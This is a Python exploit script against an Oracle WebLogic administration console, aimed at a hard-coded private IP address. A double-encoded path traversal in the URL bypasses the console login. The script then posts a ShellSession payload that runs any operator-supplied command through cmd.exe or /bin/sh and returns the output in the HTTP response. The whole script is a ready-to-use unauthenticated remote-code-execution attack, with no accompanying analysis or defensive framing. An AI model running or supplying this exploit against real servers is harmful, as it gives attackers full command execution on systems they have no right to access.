import requests
import sys
import platform

url = "http://192.168.161.25:9500/console/css/%252e%252e%252fconsole.portal"

headers = {
    "Accept-Charset": "iso-8859-1,utf-8;q=0.9,*;q=0.1",
    "Accept-Language": "en",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "Close",
    "Content-Length": "1177",
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
    "Pragma": "no-cache",
    "Accept": "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*",
}

if len(sys.argv) != 3:
    print("Usage: python script.py <-win/-linux> <command>")
    sys.exit(1)

os_option = sys.argv[1]
command = sys.argv[2]

if os_option == "-win":
    cmds = ["cmd.exe", "/c", command]
elif os_option == "-linux":
    cmds = ["/bin/sh", "-c", command]
else:
    print("Invalid OS option. Use -win for Windows or -linux for Linux.")
    sys.exit(1)

payload = {
    "_nfpb": "true",
    "_pageLabel": "",
    "handle": f"""com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
field.setAccessible(true);
Object obj = field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
String[] cmds = {cmds};
String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
res.getServletOutputStream().flush();
res.getWriter().write("");
executeThread.interrupt();")""",
}

response = requests.post(url, headers=headers, data=payload)

print("Response Status Code:", response.status_code)
print("Response Content:")
print(response.text)
